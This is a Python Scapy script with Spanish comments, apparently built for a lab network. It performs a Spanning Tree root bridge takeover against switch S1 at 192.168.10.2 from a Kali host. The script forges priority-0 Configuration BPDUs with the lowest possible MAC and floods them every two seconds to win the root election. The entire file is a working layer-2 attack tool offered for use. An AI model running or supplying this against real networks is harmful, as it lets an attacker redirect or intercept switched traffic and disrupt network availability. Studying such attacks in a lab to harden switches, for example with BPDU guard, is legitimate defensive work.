#!/usr/bin/env python3
"""
STP Root Bridge Takeover
Atacante: 192.168.10.11 (Kali - eth0)
Objetivo: S1 switch en 192.168.10.2
"""

import time, sys, signal, struct
from scapy.all import Ether, LLC, Raw, sendp, get_if_hwaddr

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

IFACE    = "eth0"
ROOT_MAC = "00:00:00:00:00:01"   # MAC más baja posible = gana elección

sent_count = 0
running    = True

def signal_handler(sig, frame):
    global running
    running = False
    print(f"\n{YELLOW}[!] Detenido. BPDUs enviados: {sent_count}{RESET}")
    sys.exit(0)

def mac_to_bytes(mac):
    return bytes(int(x, 16) for x in mac.split(":"))

def checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum((data[i] << 8) + data[i+1] for i in range(0, len(data), 2))
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return ~s & 0xffff

def build_bpdu(my_mac):
    """
    Construye Configuration BPDU con prioridad 0 (máxima).
    Root BID  = prioridad 0 + MAC 00:00:00:00:00:01
    Bridge BID = prioridad 0 + nuestra MAC
    """
    root_bid   = struct.pack("!H", 0) + mac_to_bytes(ROOT_MAC)
    bridge_bid = struct.pack("!H", 0) + mac_to_bytes(my_mac)

    bpdu = (
        struct.pack("!HBB", 0x0000, 0, 0x00)  # proto, version, type=Config
        + b'\x00'                               # flags
        + root_bid                              # Root BID
        + struct.pack("!I", 0)                  # root path cost = 0
        + bridge_bid                            # Bridge BID
        + struct.pack("!H", 0x8001)             # Port ID
        + struct.pack("!HHH", 0, 20*256, 15*256) # age, maxage, fwddelay
        + struct.pack("!H", 2*256)              # hello time
    )
    return bpdu

def build_frame(my_mac):
    bpdu = build_bpdu(my_mac)
    frame = (
        Ether(src=my_mac, dst="01:80:c2:00:00:00")
        / LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
        / Raw(load=bpdu)
    )
    return frame

def main():
    global sent_count, running
    signal.signal(signal.SIGINT, signal_handler)

    my_mac = get_if_hwaddr(IFACE)

    print(f"""
{RED}{BOLD}
╔══════════════════════════════════════════════════╗
║       STP ROOT BRIDGE TAKEOVER                   ║
║  Objetivo : S1 - 192.168.10.2                    ║
║  Atacante : 192.168.10.11 (Kali - eth0)          ║
║  Root MAC : 00:00:00:00:00:01 (prioridad 0)      ║
╚══════════════════════════════════════════════════╝
{RESET}
{YELLOW}[!] Enviando BPDUs cada 2s... (Ctrl+C para detener){RESET}
{CYAN}[*] Verifica en S1: show spanning-tree vlan 1{RESET}
""")

    while running:
        frame = build_frame(my_mac)
        sendp(frame, iface=IFACE, verbose=False)
        sent_count += 1
        print(f"{GREEN}[+] [{sent_count:04d}] BPDU enviado | "
              f"Root: {ROOT_MAC} (prio=0) | Bridge: {my_mac}{RESET}")
        time.sleep(2)

    print(f"\n{GREEN}[✓] Total BPDUs: {sent_count}{RESET}")

if __name__ == "__main__":
    main()
